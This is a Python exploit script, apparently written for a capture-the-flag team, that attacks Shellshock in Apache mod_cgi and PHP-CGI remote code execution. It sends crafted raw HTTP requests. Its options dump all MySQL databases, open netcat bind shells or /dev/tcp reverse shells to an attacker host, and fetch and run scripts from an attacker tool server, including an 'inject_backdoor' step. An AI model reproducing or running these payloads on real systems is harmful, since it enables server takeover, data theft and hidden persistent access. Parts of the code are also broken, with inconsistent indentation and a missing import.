#!/usr/bin/python
import socket, urlparse, re, os, sys, getopt, time

os.environ['no_proxy'] = '127.0.0.1,localhost'
linkRegex = re.compile('<a\s*href=[\'|"](.*?)[\'"].*?.')
CRLF = "\r\n\r\n"
MEGA = 5000000

TOOLREPO="192.168.1.XXX:8000"
# python -m SimpleHTTPServer 8000

def MakeRequest(url, CUSTOM_HEADER):
    '''
    This creates the raw socket connection and sends whatever is in header.
    The header does not specificially have to be a header, it can be anytype of 
    data a server could receive
    '''
    socket.setdefaulttimeout = 0.50
    HOST = url
    PORT = 80

    # start socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # python needs a timeout, for ... reasons
    s.settimeout(0.30)
    #s.settimeout(None)

    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)

    try:
        s.connect((HOST, PORT))
    except socket.timeout:
        print "Socket timeout error"
        traceback.print_exc()
    
    s.send( CUSTOM_HEADER )

    data = (s.recv(MEGA))

    # this is the proper disconnect for a socket
    s.shutdown(1)
    s.close()

    return data

def ShellShockerRequest(shellshocker, host):
	'''
	Apache mod_cgi - Remote Exploit (Shellshock)
	https://www.exploit-db.com/exploits/34900/
	'''

    header = "GET /~petition/cgi-bin/petition.py/ HTTP/1.1" 
    header += "\nUser-Agent: %s" % shellshocker
    header += "\nAccept-Encoding: gzip,deflate" 
    header += "\nHost: " + host 
    header += "\nConnection: Close" 
    header += "\nCache-Control: no-cache" 
    header += CRLF

    return header

def ApacheCGIRequest(payload, host):
	'''
	Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution
	https://www.exploit-db.com/exploits/29290/
	'''
	
    header = "POST /cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+disable_functions%3D%22%22+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dphp%3A%2F%2Finput+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n HTTP/1.1" 
    header += "\nUser-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0"
    header += "\nAccept-Encoding: gzip,deflate" 
    header += "\nContent-Type: application/x-www-form-urlencoded"
    header += "\nContent-Length: " + str(len(payload))
    header += "\nHost: " + host 
    header += "\nConnection: Close" 
    header += "\nCache-Control: no-cache\r\n\r\n" 
    header += payload
    header += CRLF

    return header

# This one may require an increase of MEGA
def MakeShellShock(command,text):
    '''
    text is a boolean if you want to see the output or not
    '''
    SS = "() { :; }; "
    if(text):
        SHELLSHOCK_Text = "printf 'Content-Type: text/json\\r\\n\\r\\n'; "
        return SS + SHELLSHOCK_Text + command

    else:
        return SS + command

# This one may require an increase of MEGA
def MakeApacheCGI(command):
    '''
    Wrap desired system command with php script payload
    '''
    payload = '<?php system("' + command + '");die(); ?>'
    return payload

def Shellshock(host,option,script,command,rport,rhost,lhost,lport,s_arg):
    '''
    make sure iptables is open for the port(s)
    all the options are sent all the time for lack of coding time
	using the /dev/shm/ directory to run from
    '''
    SS = ""
    if host == '':
        print "[!] error entering host for SR"
        sys.exit(1)
        
    if option == 'db_dump':
        print "[!] May need to Increase size of Mega: " + str(MEGA) +" to see full output"
        time.sleep(1.5)
        SS = MakeShellShock("mysqldump -uroot  --all-databases", True)

    elif option == 'bind_shell':
        if rport == '':
            print "[!] error entering rport for bind_shell"
            sys.exit(1)

        SS = MakeShellShock("/bin/bash -c 'nc -l -p "+str(rport)+" -e /bin/bash &'",False)

    elif option == 'rev_shell':
        if (lport == '') | (lhost == ''):
            print "[!] error entering lhost or lport for rev_shell"
            sys.exit(1)

        SS = MakeShellShock("/bin/bash -c /bin/bash -i >& /dev/tcp/" + str(lhost) +"/"+str(lport)+" 0>&1 &", False)

    elif option == 'get_script':
        if script == '':
            print "[!] error entering script name for get_script"
            sys.exit(1)
        # the extra dot is to keep it hidden
        SS = MakeShellShock("/usr/bin/wget -O /dev/shm/" + script + " " + "http://" + TOOLREPO + "/" + script, False)

    elif option == 'first_script':
        if script == '':
            print "[!] error entering script name for first_script"
            sys.exit(1)
        # the dot is running a hidden file
        SS = MakeShellShock("/bin/bash /dev/shm/" + script, False)

    elif option == 'run_script':
        if script == '':
            print "[!] error entering script name for post_script"
            sys.exit(1)
        # the dot is running a hidden file
        SS = MakeShellShock("/bin/bash /dev/shm/.tools/" + script, False)

    elif option == 'custom':
        if command == '':
            print "[!] error entering command for custom"
            sys.exit(1)
        print "[*] some paths: /sbin/ /bin/ /usr/bin/ ....'member?"
        SS = MakeShellShock(command,True)

    elif option == 'script_opt':
        if s_arg == '' | script == '':
            print "[!] error entering script name or argument for script_opt"
            sys.exit(1)
        SS = MakeShellShock("/bin/bash /dev/shm/.tools/" + script + " " + s_arg, False)

    else:
        print "[!] error; type of the method is not implemented"
        sys.exit(1)

    
    # first create the port
    header = ShellShockerRequest(SS,host)
    data = MakeRequest(host,header)
    
    print "[+]"
    print header
    print "[+] sent " + host + " " + option
    print "[+] Received output"
    print data

    # two calls at the same time does not work
    # waiting doesn't work.....
    #sleep(2)       # the socket needs a second
    # open the port with IPtables
    #SS = MakeShellShock("/sbin/iptables -A INPUT -p tcp -m tcp --dport " + str(rport) + " -j ACCEPT",False)
    #header = MakeHeader(SS,host)
    #GET(host,header)

def ApacheCGI(host,option,script,command,rport,rhost,lhost,lport,s_arg):
    '''
    make sure iptables is open for the port(s)
    all the options are sent all the time for lack of coding time
	using the /dev/shm/ directory to run from
    '''
    SS = ""
    if host == '':
        print "[!] error entering host for SR"
        sys.exit(1)

    if option == 'db_dump':
        print "[!] May need to Increase size of Mega: " + str(MEGA) + " to see full output"
        time.sleep(1.5)
        SS = MakeApacheCGI("mysqldump -uroot  --all-databases" )

    elif option == 'bind_shell':
        if rport == '':
            print "[!] error entering rport for bind_shell"
            sys.exit(1)

        SS = MakeApacheCGI("/sbin/iptables -A INPUT -p tcp -m tcp --dport " + str(rport) + " -j ACCEPT; \
                            /bin/bash -c 'nc -l -p " + str(rport) + " -e /bin/bash &")
    elif option == 'rev_shell':
        if (lport == '') | (lhost == ''):
            print "[!] error entering lhost or lport for rev_shell"
            sys.exit(1)

        SS = MakeApacheCGI("/bin/bash -c /bin/bash -i >& /dev/tcp/" + str(lhost) +"/"+str(lport)+" 0>&1 &")

    elif option == 'inject_backdoor':
        SS = MakeApacheCGI("/usr/bin/wget -O /dev/shm/exp.sh http://" + TOOLREPO + "/exp.sh; \
                            /bin/bash /dev/shm/exp.sh")
    elif option == 'get_script':
        if script == '':
            print "[!] error entering script name for get_script"
            sys.exit(1)
        # the extra dot is to keep it hidden
        SS = MakeApacheCGI("/usr/bin/wget -O /dev/shm/" + script + " " + "http://" + TOOLREPO + "/" + script)

    elif option == 'first_script':
        if script == '':
            print "[!] error entering script name for first_script"
            sys.exit(1)
        # the dot is running a hidden file
        SS = MakeApacheCGI("/bin/bash /dev/shm/" + script)

    # Run script
    elif option == 'run_script':
        if script == '':
            print "[!] error entering script name for post_script"
            sys.exit(1)
        # the dot is running a hidden file
        SS = MakeApacheCGI("/bin/bash /dev/shm/.tools/" + script)

    # Run script with arguments
    elif option == 'script_opt':
        if s_arg == '' | script == '':
            print "[!] error entering script name or argument for script_opt"
            sys.exit(1)
        SS = MakeApacheCGI("/bin/bash /dev/shm/.tools/" + script + " " + s_arg)

    # Run custom command
    elif option == 'custom':
        if command == '':
            print "[!] error entering command for custom"
            sys.exit(1)
        print "[*] some paths: /sbin/ /bin/ /usr/bin/ ....'member?"
        SS = MakeApacheCGI(command)

    else:
        print "[!] error; type of the method is not implemented"
        sys.exit(1)

    
    # first create the port
    header = ApacheCGIRequest(SS, host)
    data = MakeRequest(host, header)
    
    print "[+]"
    print header
    print "[+] sent " + host + " " + option
    print "[+] Received output"
    print data

def usage():
    print ";;;;;;;;;;;;;;;;;.=./,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"
    print "[^]       Capture the Flag Sploiting: Team 3      [^]"
    print "[*]         Check The Source Before Running       [*]"
    print "[+]  -- raw sockets --                            [+]"
    print "[+]      shell_shock                              [+]"
    print "[?]      apache+php                               [?]"
    print ",,,,,,,,,,,,,,,,,,,,,\.=. Usage ;;;;;;;;;;;;;;;;;;;;;"
    print "                                                     "
    print sys.argv[0] + " -h -i <IP> -p# -m method -t type      "
    print "               -l <host> -c cmd -s <name> -a arg     "
    print "Method>  'SR':                                       "
    print "             'db_dump'                               "
    print "             'bind_shell'    +p                      "
    print "             'rev_shell'     +p +l                   "
    print "             'get_script'    +s                      "
    print "                             exp.sh dump.sh cmnd.sh  "
    print "             'first_script'  +s                      "
    print "                             exp.sh                  "
    print "             'run_script'    +s                      "
    print "                             post.sh dump.sh cmnd.sh "
    print "             'script_opt'    +s +a                   "
    print "                             dump.sh post.sh         "
    print "             'custom'        +c                      "
    print "                 \--> *remember to include paths!    "
	print "														"
    print "Method>  'AP':                                       "
    print "             'db_dump'                               "
    print "             'bind_shell'    +p                      "
    print "             'rev_shell'     +p +l                   "
    print "             'inject_backdoor'                       "
    print "             'get_script'    +s                      "
    print "                             exp.sh dump.sh cmnd.sh  "
    print "             'first_script'  +s                      "
    print "                             exp.sh                  "
    print "             'run_script'    +s                      "
    print "                             post.sh dump.sh cmnd.sh "
    print "             'script_opt'    +s +a                   "
    print "                             dump.sh post.sh         "
    print "             'custom'        +c                      "
    print "                 \--> *remember to include paths!    "


#### MAIN ####
def main(argv):

    host = ''
    command = ''
    method = ''
    script = ''
    option = ''
    rhost = ''
    rport = ''
    lhost = ''
    lport = ''
    s_arg = ''

    if len(sys.argv) < 2:
        usage()
        sys.exit(2)
        
    try:
        opts, args = getopt.getopt(argv,"hi:m:c:t:s:p:",["attack=","lhost=","rhost=","rport=","lport=","sarg="])
    except getopt.GetoptError:
        usage()
        sys.exit(2)

    for opt, arg in opts:
        if opt == '-h':
            usage()
            sys.exit()

        elif opt in ("-i","attack="):
            host = arg
        
        elif opt in ("-c"):
            command = arg
        
        elif opt in ("-m"):
            method = arg

        elif opt in ("-t"):
            option = arg

        elif opt in ("-s"):
            script = arg

        elif opt in ("-p"):
            port = arg

        elif opt in ("-a","--sarg"):
            s_arg = arg

        elif opt in ("--lhost"):
            lhost = arg

        elif opt in ("--lport"):
            lport = arg

        elif opt in ("--rhost"):
            rhost = arg

        elif opt in ("--rport"):
            rport = arg
            print "found rport: " + rport

        
    print "[*] 'Member looking through the source and making changes? I 'member \n"
    if method == "SR":
        if option == '':
            print "[!] error setting type for " + method
            sys.exit(1)
            
        Shellshock(host,option,script,command,rport,rhost,lhost,lport,s_arg)

    elif method == "AP":
        if option == '':
            print "[!] error setting type for " + method
            sys.exit(1)

        ApacheCGI(host,option,script,command,rport,rhost,lhost,lport,s_arg)

if __name__ == "__main__":
    main(sys.argv[1:])
